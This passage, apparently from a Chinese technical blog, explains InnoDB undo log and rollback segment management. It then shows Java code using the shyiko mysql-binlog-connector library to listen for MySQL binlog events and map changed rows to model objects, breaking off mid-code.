日志也要分别记录，所以一个事务中如果同时对临时表，普通表进行增删改操作，就会有4个链表</p><p>undo log segment header 拥有的部分属性如下：</p><p>1，trx_undo_state：本 undo 页面链表处于什么状态，我们可以用该属性了解事务是否结束，可能的状态有下面几种：</p><p>trx_undo_active：活跃状态，即一个活跃的事务正在向这个Undo页面链表中写入Undo日志。<br>trx_undo_cached：被缓存状态，该状态的Undo页面链表等待被其他事务重用。<br>trx_undo_to_free：等到被释放的状态，对于insert undo类型，在其对应的事务提交后，该链表不会被重用，就是这种状态<br>trx_undo_purge：等待被purge的状态，对于update undo类型，如果在其对应的事物提交后，该链表不能被重用，则处于这种状态<br>2，trx_undo_fseg_header：本 Undo 页面链表对应的段的 Segment Header 信息</p><p>3，trx_undo_page_list：Undo 页面链表的基节点，用于串联起其他页面的 trx_undo_page_node 属性，形成一个链表</p><p>因此，一个事务的 undolog 不是由页为单位来管理的，而是由链表来管理的，那应该需要一个整合的地方来管理这些链表吧，我们提出了回滚段的概念。回滚段就是被称为 Rollback Segment Header 的页面，这个页面中存放了各个 Undo 页面链表的 first undo page 的页号，这些页号被称为 undo slot。这样我们就可以提供 slot 来找到对应的链表头了</p><p>一个事务在执行过程中最多分配4个undo页面链表，一个回滚段中只有1024个undo slot，意味着同时只支持1024个事务的并发，</p><p>为了支持更多的事务执行，Innodb定义了128个回滚段，因此可以支持更多的事务，这些回滚段的页面存在系统表空间的第五个页面的一个区域中</p><h3 id="事务分配-undolog-的过程"><a href="#事务分配-undolog-的过程" class="headerlink" title="事务分配 undolog 的过程"></a>事务分配 undolog 的过程</h3><p>事务首次修改普通表的记录时，先去系统表空间的5号页面中分配到一个回滚段，之后该事务再修改记录时，不会重复分配，多个回滚段的分配方式使用 round-robin 来分配，从第一大类中循环分配回滚段给多个事务</p><p>分配到回滚段后，查看回滚段的两个 cached 链表是否有缓存的 undo slot，不同的操作看不同的链表，insert 类的看 insert undo cached，update 类型的看 update undo cached</p><p>如果在缓存中没找到，就从回滚段中分配一个可用的 undo slot</p><p>找到可用的 undo slot，如果该 slot 是从缓存链表中获取的，其 Undo Log Segment 已经分配，否则就需要重新分配一个 Undo Log Segment，然后从该 Segment 中申请一个页面作为 Undo 页面链表的 first undo page，并把该页填入 undo slot 中</p><p>事务开始写入日志到 Undo 页面链表中</p><h2 id="shyiko监听解析binlog日志"><a href="#shyiko监听解析binlog日志" class="headerlink" title="shyiko监听解析binlog日志"></a>shyiko监听解析binlog日志</h2><p><a href="https://github.com/shyiko/mysql-binlog-connector-java" target="_blank" rel="noopener">shyiko项目地址</a></p><h3 id="binlog监听器"><a href="#binlog监听器" class="headerlink" title="binlog监听器"></a>binlog监听器</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.nacos.api.config.annotation.NacosValue;</span><br><span class="line"><span class="keyword">import</span> com.github.shyiko.mysql.binlog.BinaryLogClient;</span><br><span class="line"><span class="keyword">import</span> com.github.shyiko.mysql.binlog.event.Event;</span><br><span class="line"><span class="keyword">import</span> com.github.shyiko.mysql.binlog.event.EventData;</span><br><span class="line"><span class="keyword">import</span> com.github.shyiko.mysql.binlog.event.EventType;</span><br><span class="line"><span class="keyword">import</span> com.github.shyiko.mysql.binlog.event.TableMapEventData;</span><br><span class="line"><span class="keyword">import</span> com.google.common.collect.Maps;</span><br><span class="line"><span class="keyword">import</span> com.pwc.sdc.FPA.fms.event.AssembleCostEvent;</span><br><span class="line"><span class="keyword">import</span> com.pwc.sdc.FPA.fms.event.AssembleHeadcountEvent;</span><br><span class="line"><span class="keyword">import</span> com.pwc.sdc.FPA.utils.FPAStringUtils;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.ApplicationArguments;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.ApplicationRunner;</span><br><span class="line"><span class="keyword">import</span> org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.CompletableFuture;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinLogListener</span> <span class="keyword">implements</span> <span class="title">ApplicationRunner</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//主库地址</span></span><br><span class="line">    <span class="meta">@NacosValue</span>(<span class="string">"$&#123;spring.datasource.master.url&#125;"</span>)</span><br><span class="line">    <span class="keyword">private</span> String url;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//主库username</span></span><br><span class="line">    <span class="meta">@NacosValue</span>(<span class="string">"$&#123;spring.datasource.master.username&#125;"</span>)</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//主库密码</span></span><br><span class="line">    <span class="meta">@NacosValue</span>(<span class="string">"$&#123;spring.datasource.master.password&#125;"</span>)</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="meta">@Qualifier</span>(<span class="string">"threadPoolTaskExecutor"</span>)</span><br><span class="line">    <span class="keyword">private</span> ThreadPoolTaskExecutor executor;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> AssembleEvent assembleEvent;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> HashMap&lt;String, String&gt; tableInfo = Maps.newHashMap();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(ApplicationArguments args)</span> </span>&#123;</span><br><span class="line">        assembleEvent.doUpdate(executor);</span><br><span class="line">        CompletableFuture.runAsync(<span class="keyword">this</span>::connectMysqlBinLog, executor);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 连接mysqlBinLog</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">connectMysqlBinLog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log.info(<span class="string">"监控BinLog服务已启动"</span>);</span><br><span class="line">        Map&lt;String, String&gt; jdbcInfo = FPAStringUtils.getJdbcInfo(url);</span><br><span class="line">        BinaryLogClient client = <span class="keyword">new</span> BinaryLogClient(jdbcInfo.get(<span class="string">"host"</span>), Integer.parseInt(jdbcInfo.get(<span class="string">"port"</span>)), username, password);</span><br><span class="line">        client.setServerId(<span class="number">1</span>);</span><br><span class="line">        client.setKeepAlive(<span class="keyword">true</span>);</span><br><span class="line">        client.registerEventListener(event -&gt; event(jdbcInfo, event));</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            client.connect();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">event</span><span class="params">(Map&lt;String, String&gt; jdbcInfo, Event event)</span> </span>&#123;</span><br><span class="line">        EventData data = event.getData();</span><br><span class="line">        TableMapEventData tableMapEventData;</span><br><span class="line">        EventType eventType = event.getHeader().getEventType();</span><br><span class="line">        <span class="keyword">if</span> (eventType == EventType.TABLE_MAP) &#123;</span><br><span class="line">            tableMapEventData = (TableMapEventData) data;</span><br><span class="line">            String database = tableMapEventData.getDatabase();</span><br><span class="line">            String table = tableMapEventData.getTable();</span><br><span class="line">            tableInfo.put(<span class="string">"database"</span>, database);</span><br><span class="line">            tableInfo.put(<span class="string">"table"</span>, table);</span><br><span class="line">        &#125;</span><br><span class="line">        assembleHeadcountEvent.assembleHeadcount(jdbcInfo, tableInfo, event, executor);</span><br><span class="line">        assembleCostEvent.assembleCost(jdbcInfo, tableInfo, event, executor);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>binlog事件处理类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AssembleEvent</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;String&gt; TABLE_NAME = Lists.newArrayList(<span class="string">"LISTENER_DATABASE"</span>);</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> DatabaseUpdateService databaseUpdateService;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">assembleCost</span><span class="params">(Map&lt;String, String&gt; jdbcInfo, HashMap&lt;String, String&gt; map, Event event, Executor executor)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 当LISTENER_DATABASE表发生变化</span></span><br><span class="line">        <span class="keyword">if</span> (StringUtils.equals(jdbcInfo.get(<span class="string">"database"</span>), map.get(<span class="string">"database"</span>)) &amp;&amp; TABLE_NAME.contains(map.get(<span class="string">"table"</span>))) &#123;</span><br><span class="line">        <span class="comment">// XID表示事务提交，即当LISTENER_DATABASE发生事务提交走下面分支</span></span><br><span class="line">            <span class="keyword">if</span> (event.getHeader().getEventType() == EventType.XID) &#123;</span><br><span class="line">                log.info(<span class="string">"监听到变化，进行关联更新"</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">this</span>.doUpdate(executor);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    map.clear();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doUpdate</span><span class="params">(Executor executor)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//调用mapper更新sql</span></span><br><span class="line">        CompletableFuture.runAsync(() -&gt; databaseUpdateService.update(), executor);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="binlog数据转换器"><a href="#binlog数据转换器" class="headerlink" title="binlog数据转换器"></a>binlog数据转换器</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseConverter</span> <span class="keyword">implements</span> <span class="title">Converter</span>&lt;<span class="title">BinlogData</span>&lt;<span class="title">List</span>&lt;<span class="title">Map</span>&lt;<span class="title">String</span>, <span class="title">Object</span>&gt;&gt;&gt;&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> ResourceLoader resourceLoader;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> JdbcTemplate jdbcTemplate;</span><br><span class="line">    <span class="meta">@Value</span>(<span class="string">"$&#123;binglog.convert.model.package&#125;"</span>)</span><br><span class="line">    <span class="keyword">private</span> String packageName;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> CodeUtil codeUtil;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> DbProperties dbProperties;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 需要转成的model对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;Class&gt; classes;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 拼接sql常量</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String SQL_STATEMENT_SELECT = <span class="string">"SELECT "</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String SQL_STATEMENT_FROM = <span class="string">" FROM "</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String SQL_STATEMENT_WHERE = <span class="string">" WHERE "</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String SQL_STATEMENT_LIMIT = <span class="string">" LIMIT 1"</span>;</span><br><span class="line">    <span class="meta">@PostConstruct</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        classes = getClass(packageName, resourceLoader);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List <span class="title">convert</span><span class="params">(BinlogData&lt;List&lt;Map&lt;String, Object&gt;&gt;&gt; data)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (Class clazz : classes) &#123;</span><br><span class="line">            Table tableAnnotation = (Table) clazz.getAnnotation(Table<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            <span class="keyword">if</span> (tableAnnotation != <span class="keyword">null</span> &amp;&amp; StringUtils.isNotBlank(tableAnnotation.name())) &#123;</span><br><span class="line">                String dbName = dbProperties.getValue(tableAnnotation.catalog());<span class="comment">//获取实际数据库名称</span></span><br><span class="line">                <span class="keyword">if</span> (data.getDatabase().equals(dbName) &amp;&amp; tableAnnotation.name().equals(data.getTable())) &#123;</span><br><span class="line">                    <span class="comment">// 找到库 需要处理的表（data.getTable()）对应的model</span></span><br><span class="line">                    <span class="keyword">return</span> setBeanProperties(data.getData(), clazz);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> List <span class="title">setBeanProperties</span><span class="params">(List&lt;Map&lt;String, Object&gt;&gt; list, Class clazz)</span> </span>&#123;</span><br><span class="line">        List target = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Field[] fields = clazz.getDeclaredFields();</span><br><span class="line">            <span class="keyword">for</span> (Object object : list) &#123;</span><br><span class="line">                target.add(clazz.newInstance());</span><br><span class="line">            &#125;</span><br><span class="line">            List&lt;Field&gt; fieldList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">            <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">                Column column = field.getAnnotation(Column<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                <span class="keyword">if</span> (column != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// 该字段需要通过配置的库表查询</span></span><br><span class="line">                    <span class="keyword">if</span> ( StringUtils.isNotBlank(column.table())) &#123;</span><br><span class="line">                        <span class="comment">// 需要查询该字段的值，本数据未包含该字段值,查询可能以来本对象其他字段值</span></span><br><span class="line">                        <span class="comment">// 先设置不需要查库的字段（查库字段可能以来这些字段得值）</span></span><br><span class="line">                        <span class="comment">// setFieldFromTable(field, target, column);</span></span><br><span class="line">                        fieldList.add(field);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        setFieldFromBinlog(field, target, list, column);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// cachedMap 用于缓存,多个字段值依赖同一条数据库数据</span></span><br><span class="line">            Map&lt;String, Map&lt;String, Object&gt;&gt; cachedMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">            <span class="keyword">for</span> (Field field : fieldList) &#123;</span><br><span class="line">                Column column = field.getAnnotation(Column<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                <span class="keyword">if</span> (column != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// 该字段需要通过配置的库表查询</span></span><br><span class="line">                    <span class="keyword">if</span> ( StringUtils.isNotBlank(column.table()) &amp;&amp; StringUtils.isNotBlank(column.whereCause())) &#123;</span><br><span class="line">                        <span class="comment">// 需要查询该字段的值，本数据未包含该字段值</span></span><br><span class="line">                        setFieldFromTable(field, cachedMap, list, target, column);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            log.info(<span class="string">""</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> target;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *  类型转换</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> field</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> target</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> list</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> column</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setFieldFromBinlog</span><span class="params">(Field field, List target, List&lt;Map&lt;String, Object&gt;&gt; list, Column column)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isNotBlank(column.name())) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; list.size(); i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Object value = list.get(i).get(column.name());</span><br><span class="line">                    <span class="keyword">if</span> (value != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        log.debug(<span class="string">"field:&#123;&#125;,value:&#123;&#125;"</span>, field.getName(), column.name());</span><br><span class="line">                        BinLogDict binLogDict = field.getAnnotation(BinLogDict<span class="class">.<span class="keyword">class</span>)</span>;<span class="comment">//判断是否需要翻译</span></span><br><span class="line">                        <span class="keyword">if</span> (binLogDict != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            Object companyCode = codeUtil.getCountryCode(binLogDict.codeType(), value, field.getType());</span><br><span class="line">                            log.info(<span class="string">"get companyCode fail value:&#123;&#125; companyCode:&#123;&#125;"</span>, value, companyCode);</span><br><span class="line">                            field.set(target.get(i), companyCode);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            field.set(target.get(i), value);</span><br><span class="line">                        &#125;</span><br><span class="line">                        field.setAccessible(<span class="keyword">false</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    log.info(<span class="string">""</span>, e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *  数据库类型转换</span></span><br><span class="line"><span class="comment">     * 该字段从数据库查询设置</span></span><br><span class="line"><span class="comment">     * $&#123;id&#125; 参数取本对象的id 值</span></span><br><span class="line"><span class="comment">     * #&#123;id&#125; 参数取binlog 过来的id 值</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;</span></span><br><span class="line"><span class="comment">     * // 本对象缓存（db.table.columnName.value）</span></span><br><span class="line"><span class="comment">     * // 本对象缓存（db.table.id.3）</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> field</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> list</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> column</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setFieldFromTable</span><span class="params">(Field field, Map&lt;String, Map&lt;String, Object&gt;&gt; cachedMap, List&lt;Map&lt;String, Object&gt;&gt; datas, List list, Column column)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field.setAccessible(<span 